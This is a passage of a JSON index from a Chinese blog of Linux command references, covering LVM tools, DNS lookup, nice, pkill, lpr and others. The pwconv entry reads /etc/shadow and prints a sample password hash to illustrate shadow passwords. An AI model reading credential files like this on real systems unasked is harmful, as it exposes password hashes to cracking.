read","time":49000,"words":214,"minutes":1},"date":"2022-02-01 21:42:09","dateFormat":"2022-02-01"},{"content":"显示 LVM 卷组的信息。 补充说明 vgdisplay 命令用于显示 LVM 卷组的信息。如果不指定&quot;卷组&quot;参数，则分别显示所有卷组的属性。 语法 vgdisplay (选项) (参数) 选项 -A：仅显示活动卷组的属性； -s：使用短格式输出的信息。 参数 卷组：要显示属性的卷组名称。 实例 使用 vgdisplay 命令显示存在的卷组&quot;vg1000&quot;的属性。在命令行中输入下面的命令： [root@localhost ~]# vgdisplay vg1000 #显示卷组&quot;vg1000&quot;的属性 输出信息如下： --- Volume group --- VG Name vg1000 ......省略部分输出内容...... free PE / Size 50 / 200.00 MB VG UUID ICprwg-ZmhA-JKYF-WYuy-jNHa-AyCN-ZS5F7B ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"vgdisplay","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/vgdisplay/","stats":{"text":"1 min read","time":41000,"words":174,"minutes":1},"date":"2022-02-01 21:41:46","dateFormat":"2022-02-01"},{"content":"Debian Linux 中覆盖文件的所有权和模式。 补充说明 dpkg-statoverride 命令用于 Debian Linux 中覆盖文件的所有权和模式，让 dpkg 于包安装时使得文件所有权与模式失效。 语法 dpkg-statoverride (选项) 选项 -add：为文件添加一个改写； --remove：为文件删除一个改写； --list：显示所有改写列表； --update：如果文件存在，则立刻执行改写操作。 实例 修改文件夹的权限属性： sudo dpkg-statoverride --update --add nagios nagios 751 /var/lib/nagios3 强制修改文件夹的权限属性： sudo dpkg-statoverride --force --update --add root sasl 755 /var/spool/postfix/var/run/saslauthd 将文件从数据库中删除： sudo dpkg-statoverride --remove /usr/bin/wall ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"dpkg-statoverride","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/dpkg-statoverride/","stats":{"text":"1 min read","time":43000,"words":177,"minutes":1},"date":"2022-02-01 21:41:29","dateFormat":"2022-02-01"},{"content":"查询域名 DNS 信息的工具。 补充说明 nslookup 命令是常用域名查询工具，就是查 DNS 信息用的命令。 nslookup4 有两种工作模式，即“交互模式”和“非交互模式”。在“交互模式”下，用户可以向域名服务器查询各类主机、域名的信息，或者输出域名中的主机列表。而在“非交互模式”下，用户可以针对一个主机或域名仅仅获取特定的名称或所需信息。 进入交互模式，直接输入 nslookup 命令，不加任何参数，则直接进入交互模式，此时 nslookup 会连接到默认的域名服务器（即/etc/resolv.conf的第一个 dns 地址）。或者输入nslookup -nameserver/ip。进入非交互模式，就直接输入nslookup 域名就可以了。 语法 nslookup (选项) (参数) 选项 -sil：不显示任何警告信息。 参数 域名：指定要查询域名。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"nslookup","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/nslookup/","stats":{"text":"1 min read","time":50000,"words":239,"minutes":1},"date":"2022-02-01 21:41:10","dateFormat":"2022-02-01"},{"content":"用来开启用户的投影密码。 补充说明 pwconv 命令用来开启用户的投影密码。Linux 系统里的用户和群组密码，分别存放在名称为 passwd 和 group 的文件中， 这两个文件位于/etc目录下。因系统运作所需，任何人都得以读取它们，造成安全上的破绽。投影密码将文件内的密码改存在/etc目录下的 shadow 和 gshadow 文件内，只允许系统管理者读取，同时把原密码置换为&quot;x&quot;字符，有效的强化了系统的安全性。 语法 pwconv 实例 cat /etc/passwd | grep test test:x:3001:3001::/home/test:/bin/sh 此时可以发现密码段是 x cat /etc/shadow | grep test test:$6$nYOEWamm$bz07nlv/.RgJufb3FAqJJeULfwybzgxmrWqbk7O4vI0KsT6N.ujrh6dDIUcAJdfjksyuyAFDPIngZeD3cgcf.0:15022:0:99999:7::: ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"pwconv","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/pwconv/","stats":{"text":"1 min read","time":46000,"words":198,"minutes":1},"date":"2022-02-01 21:40:26","dateFormat":"2022-02-01"},{"content":"命令处理传送进来的文件。 补充说明 uupick 命令处理传送进来的文件。 当其他主机通过 UUCP 将文件传送进来时，可利用 uupick 指令取出这些文件。 语法 uupick [-v][-I&lt;配置文件&gt;][-s&lt;主机&gt;][-x&lt;层级&gt;][--help] 选项 -I&lt;配置文件&gt;或--config&lt;配置文件&gt; 指定配置文件。 -s&lt;主机&gt;或--system&lt;主机&gt; 处理由指定主机传送过来的文件。 -v或--version 显示版本信息。 --help 显示帮助。 例子 处理由主机 localhost 传送过来的文件。在命令行直接输入如下命令： uupick-s localhost 该命令通常没有输出。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"uupick","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/uupick/","stats":{"text":"1 min read","time":41000,"words":178,"minutes":1},"date":"2022-02-01 17:56:45","dateFormat":"2022-02-01"},{"content":"查询 SELinux 的策略提供多少相关规则。 补充说明 seinfo 命令是用来查询 SELinux 的策略提供多少相关规则，一个主体进程能否读取到目标文件资源的重点是在于 SELinux 的策略以及策略内的各项规则，然后再通过该规则的定义去处理各项目标文件的安全上下文，尤其是“类型”部分。SELinux 的策略与规则管理相关命令：seinfo 命令、sesearch 命令、getsebool 命令、setsebool 命令、semanage 命令。 语法 seinfo（选项） 选项 -A：列出SELinux的状态、规则布尔值、身份识别、角色、类型等所有信息。 -t：列出SELinux所有类型(type)的种类。 -r：列出SELinux所有角色(role)的种类。 -u：列出SELinux所有身份识别(user)的种类。 -b：列出所有规则的种类（布尔值）。 实例 列出与 httpd 有关的规则： seinfo -b | grep httpd ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"seinfo","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/seinfo/","stats":{"text":"1 min read","time":51000,"words":234,"minutes":1},"date":"2022-02-01 17:56:31","dateFormat":"2022-02-01"},{"content":"打印当前主机所有登陆用户的名称。。 概要 users [OPTION]... [FILE] 主要用途 每个显示的用户名对应一个登录会话； 如果一个用户有不止一个登录会话，那他的用户名将显示相同的次数。 选项 --help 显示帮助信息并退出。 --version 显示版本信息并退出。 参数 FILE（可选）：记录用户当前登录情况的文件； 默认使用 /var/run/utmp 、/var/log/wtmp。 返回值 返回 0 表示成功，返回非 0 值表示失败。 例子 [root@localhost ~]# usersroot root 注意 该命令是 GNU coreutils 包中的命令，相关的帮助信息请查看man -s 1 users，info coreutils 'users invocation'。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"users","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/users/","stats":{"text":"1 min read","time":39000,"words":175,"minutes":1},"date":"2022-02-01 17:55:18","dateFormat":"2022-02-01"},{"content":"创建或更新 slocate 命令所必需的数据库文件。 补充说明 updatedb 命令用来创建或更新 slocate 命令所必需的数据库文件。updatedb 命令的执行过程较长，因为在执行时它会遍历整个系统的目录树，并将所有的文件信息写入 slocate 数据库文件中。 补充说明：slocate 本身具有一个数据库，里面存放了系统中文件与目录的相关信息。 语法 updatedb (选项) 选项 -o&lt;文件&gt;：忽略默认的数据库文件，使用指定的 slocate 数据库文件； -U&lt;目录&gt;：更新指定目录的 slocate 数据库； -v：显示执行的详细过程。 实例 实用 updatedb 命令的-U选项可以指定要更新 slocate 数据库的目录。 updatedb -U /usr/local/ 更新指定命令的 slocate 数据库 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"updatedb","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/updatedb/","stats":{"text":"1 min read","time":48000,"words":220,"minutes":1},"date":"2022-02-01 17:55:08","dateFormat":"2022-02-01"},{"content":"扩展逻辑卷空间。 补充说明 lvextend 命令用于在线扩展逻辑卷的空间大小，而不中断应用程序对逻辑卷的访问。使用 lvextend 命令动态在线扩展磁盘空间，整个空间扩展过程对于应用程序来说是完全透明的。 语法 lvextend (选项) (参数) 选项 -L：指定逻辑卷的大小，单位为“kKmMgGtT”字节； -l：指定逻辑卷的大小（LE 数）。 参数 逻辑卷：指定要扩展空间的逻辑卷。 实例 使用 lvextend 命令为逻辑卷/dev/vg1000/lvol0增加 100M 空间。在命令行中输入下面的命令： [root@localhost ~]# lvextend -L +100M /dev/vg1000/lvol0 #为了解决增加 100M 空间 输出信息如下： Extending logical volume lvol0 to 300.00 MB Logical volume lvol0 successfully resized ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"lvextend","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/lvextend/","stats":{"text":"1 min read","time":45000,"words":198,"minutes":1},"date":"2022-02-01 17:54:48","dateFormat":"2022-02-01"},{"content":"改变程序执行的优先权等级。 补充说明 nice 命令用于以指定的进程调度优先级启动其他的程序。 语法 nice (选项) (参数) 选项 -n：指定进程的优先级（整数）。 参数 指令及选项：需要运行的指令及其他选项。 实例 新建一个进程并设置优先级，将当前目录下的 documents 目录打包，但不希望 tar 占用太多 CPU： nice -19 tar zcf pack.tar.gz documents 方法非常简单，即在原命令前加上nice -19。很多人可能有疑问了，最低优先级不是 19 么？那是因为这个“-19”中的“-”仅表示参数前缀； 所以，如果希望将当前目录下的 documents 目录打包，并且赋予 tar 进程最高的优先级： nice --19 tar zcf pack.tar.gz documents ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"nice","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/nice/","stats":{"text":"1 min read","time":47000,"words":211,"minutes":1},"date":"2022-02-01 17:54:35","dateFormat":"2022-02-01"},{"content":"常用的分析域名查询工具。 补充说明 host 命令是常用的分析域名查询工具，可以用来测试域名系统工作是否正常。 语法 host (选项) (参数) 选项 -a：显示详细的 DNS 信息； -c&lt;类型&gt;：指定查询类型，默认值为“IN“； -C：查询指定主机的完整的 SOA 记录； -r：在查询域名时，不使用递归的查询方式； -t&lt;类型&gt;：指定查询的域名信息类型； -v：显示指令执行的详细信息； -w：如果域名服务器没有给出应答信息，则总是等待，直到域名服务器给出应答； -W&lt;时间&gt;：指定域名查询的最长时间，如果在指定时间内域名服务器没有给出应答信息，则退出指令； -4：使用 IPv4； -6：使用 IPv6. 参数 主机：指定要查询信息的主机信息。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"host","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/host/","stats":{"text":"1 min read","time":51000,"words":237,"minutes":1},"date":"2022-02-01 17:54:07","dateFormat":"2022-02-01"},{"content":"将.Z 压缩包重新转化为 gzip 命令压缩的.gz 压缩包。 补充说明 znew 命令用于将使用 compress 命令压缩的“.Z”压缩包重新转化为使用 gzip 命令压缩的“.gz”压缩包。 语法 znew (选项) (参数) 选项 -f：# 强制执行转换操作，即是目标“.gz”已经存在； -t：# 删除原文件前测试新文件； -v：# 显示文件名和每个文件的压缩比； -9：# 食用油花的压缩比，速度较慢； -P：# 使用管道完成转换操作，以降低磁盘空间使用； -K：# 当“.Z”文件比“.gz”文件小时，保留“.Z”文件。 参数 文件：指定 compress 指令压缩生成的“.Z”压缩包。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"znew","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/znew/","stats":{"text":"1 min read","time":39000,"words":180,"minutes":1},"date":"2022-02-01 17:53:48","dateFormat":"2022-02-01"},{"content":"扫描并显示系统中的卷组。 补充说明 vgscan 命令查找系统中存在的 LVM 卷组，并显示找到的卷组列表。vgscan 命令仅显示找到的卷组的名称和 LVM 元数据类型，要得到卷组的详细信息需要使用 vgdisplay 命令。 语法 vgscan (选项) 选项 -d：调试模式； --ignorerlockingfailure：忽略锁定失败的错误。 实例 使用 vgscan 命令扫描系统中所有的卷组。在命令行中输入下面的命令： [root@localhost ~]# vgscan #扫描并显示 LVM 卷组列表 输出信息如下： Found volume group &quot;vg2000&quot; using metadata type lvm2 Found volume group &quot;vg1000&quot; using metadata type lvm2 说明：本例中，vgscan 指令找到了两个 LVM2 卷组&quot;vg1000&quot;和&quot;vg2000&quot;。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"vgscan","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/vgscan/","stats":{"text":"1 min read","time":45000,"words":190,"minutes":1},"date":"2022-02-01 17:53:27","dateFormat":"2022-02-01"},{"content":"向卷组中添加物理卷。 补充说明 vgextend 命令用于动态扩展 LVM 卷组，它通过向卷组中添加物理卷来增加卷组的容量。LVM 卷组中的物理卷可以在使用 vgcreate 命令创建卷组时添加，也可以使用 vgextend 命令动态的添加。 语法 vgextend (选项) (参数) 选项 -d：调试模式； -t：仅测试。 参数 卷组：指定要操作的卷组名称； 物理卷列表：指定要添加到卷组中的物理卷列表。 实例 使用 vgextend 命令向卷组&quot;vg2000&quot;中添加物理卷。在命令行中输入下面的命令： [root@localhost ~]# vgextend vg2000 /dev/sdb2 #将物理卷&quot;/dev/sdb2&quot;加入卷组&quot;vg2000&quot; 输出信息如下： Volume group &quot;vg2000&quot; successfully extended ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"vgextend","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/vgextend/","stats":{"text":"1 min read","time":45000,"words":198,"minutes":1},"date":"2022-02-01 17:53:06","dateFormat":"2022-02-01"},{"content":"去除文件名中的非目录部分。 补充说明 dirname 命令去除文件名中的非目录部分，仅显示与目录有关的内容。dirname 命令读取指定路径名保留最后一个/及其后面的字符，删除其他部分，并写结果到标准输出。如果最后一个&lt;cite&gt;/&lt;/cite&gt;后无字符，dirname 命令使用倒数第二个/，并忽略其后的所有字符。dirname 和 basename 通常在 shell 内部命令替换使用，以指定一个与指定输入文件名略有差异的输出文件名。 语法 dirname (选项) (参数) 选项 --help：显示帮助； --version：显示版本号。 实例 dirname // 结果为 / dirname /a/b/ 结果为：/a dirname a 结果为 . dirname a/b 结果为路径名 a ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"dirname","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/dirname/","stats":{"text":"1 min read","time":44000,"words":202,"minutes":1},"date":"2022-02-01 17:50:33","dateFormat":"2022-02-01"},{"content":"调整逻辑卷空间大小。 补充说明 lvresize 命令用于调整 LVM 逻辑卷的空间大小，可以增大空间和缩小空间。使用 lvresize 命令调整逻辑卷空间大小和缩小空间时需要谨慎，因为它有可能导致数据丢失。 语法 lvresize (选项) (参数) 选项 -L：指定逻辑卷的大小，单位为“kKmMgGtT”字节； -l：指定逻辑卷的大小（LE 数）。 参数 逻辑卷：指定要删除的逻辑卷。 实例 使用 lvresize 命令调整最大的逻辑卷大小。在命令行中输入下面的命令： [root@localhost ~]# lvresize -L +200M /dev/vg1000/lvol0 #将逻辑卷空间增加 200M 输出信息如下： Extending logical volume lvol0 to 280.00 MB Logical volume lvol0 successfully resized ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"lvresize","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/lvresize/","stats":{"text":"1 min read","time":43000,"words":190,"minutes":1},"date":"2022-02-01 17:50:12","dateFormat":"2022-02-01"},{"content":"实时地监视网卡流量。 补充说明 iptraf 命令可以实时地监视网卡流量，可以生成网络协议数据包信息、以太网信息、网络节点状态和 ip 校验和错误等信息。 语法 iptraf (选项) 选项 -i 网络接口：立即在指定网络接口上开启 IP 流量监视； -g：立即开始生成网络接口的概要状态信息； -d 网络接口：在指定网络接口上立即开始监视明细的网络流量信息； -s 网络接口：在指定网络接口上立即开始监视 TCP 和 UDP 网络流量信息； -z 网络接口：在指定网络接口上显示包计数； -l 网络接口：在指定网络接口上立即开始监视局域网工作站信息； -t 时间：指定 iptraf 指令监视的时间； -B； 将标注输出重新定向到“/dev/null”，关闭标注输入，将程序作为后台进程运行； -f：清空所有计数器； -h：显示帮助信息。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"iptraf","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/iptraf/","stats":{"text":"1 min read","time":56000,"words":267,"minutes":1},"date":"2022-02-01 17:50:00","dateFormat":"2022-02-01"},{"content":"管理 NFS 共享文件系统列表。 补充说明 exportfs 命令用来管理当前 NFS 共享的文件系统列表。 参数： -a 打开或取消所有目录共享。 -o options,...指定一列共享选项，与 exports(5) 中讲到的类似。 -i 忽略 /etc/exports 文件，从而只使用默认的和命令行指定的选项。 -r 重新共享所有目录。它使 /var/lib/nfs/xtab 和 /etc/exports 同步。 它将 /etc/exports 中已删除的条目从 /var/lib/nfs/xtab 中删除，将内核共享表中任何不再有效的条目移除。 -u 取消一个或多个目录的共享。 -f 在“新”模式下，刷新内核共享表之外的任何东西。 任何活动的客户程序将在它们的下次请求中得到 mountd添加的新的共享条目。 -v 输出详细信息。当共享或者取消共享时，显示在做什么。 显示当前共享列表的时候，同时显示共享的选项。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"exportfs","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/exportfs/","stats":{"text":"1 min read","time":55000,"words":255,"minutes":1},"date":"2022-02-01 17:49:41","dateFormat":"2022-02-01"},{"content":"配置 CUPS 套件中的打印机和类。 补充说明 lpadmin 命令用于配置 CUPS 套件中的打印机和类，也被用来设置打印服务器默认打印机。 语法 lpadmin (选项) (参数) 选项 -c：将打印机加入类； -i：为打印机设置“system V”风格的接口脚本； -m：从 mode 目录设置一个标准的“system V”接口脚本或“PPD”文件； -o：为“PPD”或服务器设置选项； -r：从类中删除打印机； -u：设置打印机用户级的访问控制； -D：为打印机提供一个文字描述； -E：允许打印机接受打印任务； -L：为打印机位置提供一个文字描述； -P：为打印机指定一个 ppd 描述文件； -p：指定要配置的打印机名称； -d：设置默认打印机。 参数 打印机：指定要配置的打印机的名称。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"lpadmin","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/lpadmin/","stats":{"text":"1 min read","time":50000,"words":229,"minutes":1},"date":"2022-02-01 17:48:40","dateFormat":"2022-02-01"},{"content":"显示逻辑卷属性。 补充说明 lvdisplay 命令用于显示 LVM 逻辑卷空间大小、读写状态和快照信息等属性。如果省略&quot;逻辑卷&quot;参数，则 lvdisplay 命令显示所有的逻辑卷属性。否则，仅显示指定的逻辑卷属性。 语法 lvdisplay (参数) 参数 逻辑卷：指定要显示属性的逻辑卷对应的设备文件。 实例 使用 lvdisplay 命令显示指定逻辑卷的属性。在命令行中输入下面的命令： [root@localhost ~]# lvdisplay /dev/vg1000/lvol0 #显示逻辑卷属性 输出信息如下： --- Logical volume --- LV Name /dev/vg1000/lvol0 ......省略部分输出内容...... Block device 253:0 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"lvdisplay","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/lvdisplay/","stats":{"text":"1 min read","time":38000,"words":171,"minutes":1},"date":"2022-02-01 17:48:16","dateFormat":"2022-02-01"},{"content":"删除指定 LVM 逻辑卷。 补充说明 lvremove 命令用于删除指定 LVM 逻辑卷。如果逻辑卷已经使用 mount 命令加载，则不能使用 lvremove 命令删除。必须使用 umount 命令卸载后，逻辑卷方可被删除。 语法 lvremove (选项) (参数) 选项 -f：强制删除。 参数 逻辑卷：指定要删除的逻辑卷。 实例 使用 lvremove 命令删除指定的逻辑卷。在命令行中输入下面的命令： [root@localhost ~]# lvremove /dev/vg1000/lvol0 #删除逻辑卷&quot;lvol0&quot; 输出信息如下： Do you really want to remove active logical volume &quot;lvol0&quot;? [y/n]: y #确认删除 Logical volume &quot;lvol0&quot; successfully removed ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"lvremove","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/lvremove/","stats":{"text":"1 min read","time":40000,"words":168,"minutes":1},"date":"2022-02-01 17:48:02","dateFormat":"2022-02-01"},{"content":"使用 vgrename 命令可以重命名卷组的名称。 补充说明 grename 命令可以重命名卷组的名称。 语法 vgrename [选项 ] [旧卷组路径|旧卷组名称|旧卷组 UUID] [新卷组路径|新卷组名称 ] 选项 -d 启用调试模式-t 启用测试模式 例子 重命名卷组/dev/vg1 为/dev/vg2。 [root@localhost ~]# vgrename /dev/vg1 /dev/vg2 Volume group &quot;vg1&quot; successfullyrenamed to &quot;vg2&quot; 重命名卷组 vg1 为 vg2。 [root@localhost ~]# vgrename vg1 vg2 Volume group &quot;vg1&quot; successfully renamed to &quot;vg2&quot; ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"vgrename","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/vgrename/","stats":{"text":"1 min read","time":33000,"words":130,"minutes":1},"date":"2022-02-01 17:47:37","dateFormat":"2022-02-01"},{"content":"输出物理卷信息报表。 补充说明 pvs 命令用于输出格式化的物理卷信息报表。使用 pvs 命令仅能得到物理卷的概要信息，如果要得到更加详细的信息可以使用 pvdisplay 命令。 语法 pvs (选项) (参数) 选项 --noheadings：不输出标题头； --nosuffix：不输出空间大小的单位。 参数 物理卷：要显示报表的物理卷列表。 实例 使用 pvs 命令显示系统中所有物理卷的信息报表。在命令行中输入下面的命令： pvs # 输出物理卷信息报表 输出信息如下： PV VG fmt Attr PSize PFree /dev/sdb1 vg1000 lvm2 -- 100.00M 100.00M /dev/sdb2 lvm2 -- 101.98M 101.98M ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"pvs","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/pvs/","stats":{"text":"1 min read","time":41000,"words":181,"minutes":1},"date":"2022-02-01 17:47:21","dateFormat":"2022-02-01"},{"content":"一款表达式计算工具。 补充说明 expr 命令是一款表达式计算工具，使用它完成表达式的求值操作。 expr 的常用运算符： 加法运算：+ 减法运算：- 乘法运算：\\* 除法运算：/ 求摸（取余）运算：% 语法 expr (选项) (参数) 选项 --help：显示指令的帮助信息； --version：显示指令版本信息。 参数 表达式：要求值的表达式。 实例 result=`expr 2 + 3`result=$(expr $no1 + 5) ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"expr","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/expr/","stats":{"text":"1 min read","time":25000,"words":118,"minutes":1},"date":"2022-02-01 17:47:08","dateFormat":"2022-02-01"},{"content":"修改卷组属性。 补充说明 vgchange 命令用于修改卷组的属性，经常被用来设置卷组是处于活动状态或非活动状态。处于活动状态的卷组无法被删除，必须使用 vgchange 命令将卷组设置为非活动状态后才能删除。 语法 vgchange (选项) (参数) 选项 -a：设置卷组的活动状态。 参数 卷组：指定要设置属性的卷组。 实例 使用 vgchange 命令将卷组状态改为活动的。在命令行中输入下面的命令： [root@localhost ~]# vgchange -ay vg1000 #将卷组&quot;vg1000&quot;设置为活动状态 输出信息如下： 1 logical volume(s) in volume group &quot;vg1000&quot; now active ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"vgchange","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/vgchange/","stats":{"text":"1 min read","time":40000,"words":179,"minutes":1},"date":"2022-02-01 17:44:29","dateFormat":"2022-02-01"},{"content":"控制文件内容输出时所占用的屏幕宽度。 补充说明 fold 命令用于控制文件内容输出时所占用的屏幕宽度。fold 命令会从指定的文件里读取内容，将超过限定列宽的列加入增列字符后，输出到标准输出设备。若不指定任何文件名称，或是所给予的文件名为“-”，则 fold 指令会从标准输入设备读取数据。 语法 fold (选项) (参数) 选项 -b 或——bytes：以 Byte 为单位计算列宽，而非采用行数编号为单位； -s 或——spaces：以空格字符作为换列点； -w&lt;每列行数&gt;或--width&lt;每列行数&gt;：设置每列的最大行数。 参数 文件：指定要显示内容的文件。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"fold","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/fold/","stats":{"text":"1 min read","time":43000,"words":202,"minutes":1},"date":"2022-02-01 17:44:13","dateFormat":"2022-02-01"},{"content":"可以按照进程名杀死进程。 补充说明 pkill 命令可以按照进程名杀死进程。pkill 和 killall 应用方法差不多，也是直接杀死运行中的程序； 如果您想杀掉单个进程，请用 kill 来杀掉。 语法 pkill (选项) (参数) 选项 -o：仅向找到的最小（起始）进程号发送信号； -n：仅向找到的最大（结束）进程号发送信号； -P：指定父进程号发送信号； -g：指定进程组； -t：指定开启进程的终端。 参数 进程名称：指定要查找的进程名称，同时也支持类似 grep 指令中的匹配模式。 实例 pgrep -l gaim2979 gaimpkill gaim 也就是说：kill 对应的是 PID，pkill 对应的是 command。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"pkill","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/pkill/","stats":{"text":"1 min read","time":41000,"words":192,"minutes":1},"date":"2022-02-01 17:41:45","dateFormat":"2022-02-01"},{"content":"将文件发送给指定打印机进行打印。 补充说明 lpr 命令用于将文件发送给指定打印机进行打印，如果不指定目标打印机，则使用默认打印机。 语法 lpr (选项) (参数) 选项 -E：与打印服务器连接时强制使用加密； -H：指定可选的打印服务器； -C：指定打印任务的名称； -P：指定接受打印任务的目标打印机； -U：指定可选的用户名； -#：指定打印的份数； -h：关闭 banner 打印； -m：打印完成后发送 E-mail； -r：打印完成后删除文件。 参数 文件：需打印的文件。 实例 将 man1 和 man2 送到打印机 lp 进行打印： lpr -P lp man1 man2 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"lpr","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/lpr/","stats":{"text":"1 min read","time":41000,"words":191,"minutes":1},"date":"2022-02-01 17:41:32","dateFormat":"2022-02-01"},{"content":"修改物理卷属性。 补充说明 pvchange 命令允许管理员改变物理卷的分配许可。如果物理卷出现故障，可以使用 pvchange 命令禁止分配物理卷上的 PE。 语法 pvchange (选项) (参数) 选项 -u：生成新的 UUID； -x：是否允许分配 PE。 参数 物理卷：指定要修改属性的物理卷所对应的设备文件。 实例 使用 pvchange 命令禁止分配指定物理卷上的 PE。在命令行中输入下面的命令： pvchange -x n /dev/sdb1 #禁止分配&quot;/dev/sdb1&quot;上的 PE 输出信息如下： Physical volume &quot;/dev/sdb1&quot; changed1 physical volume changed / 0 physical volumes not changed ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"pvchange","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/pvchange/","stats":{"text":"1 min read","time":40000,"words":170,"minutes":1},"date":"2022-02-01 17:40:19","dateFormat":"2022-02-01"},{"content":"列出 X Server 使用的字体。 补充说明 xlsfonts 命令列出 X Server 使用的字体，也能使用范本样式仅列出的符合条件的字体。 语法 xlsfonts (选项) 选项 -l：除字体名称外，同时列出字体的属性； -ll：此参数的效果和指定&quot;l&quot;参数类似，但显示更详细的信息； -lll：此参数的效果和指定&quot;ll&quot;参数类似，但显示更详细的信息； -m：配合参数&quot;-l&quot;使用时，一并列出字体大小的上下限； -n&lt;显示栏位数&gt;：设置每列显示的栏位数； -o：以 OpenFont 的形式列出字体清单； -u：列出字体清单时不依照其名称排序； -w&lt;每列字符数&gt;：设置每列的最大字符数。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"xlsfonts","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/xlsfonts/","stats":{"text":"1 min read","time":46000,"words":206,"minutes":1},"date":"2022-02-01 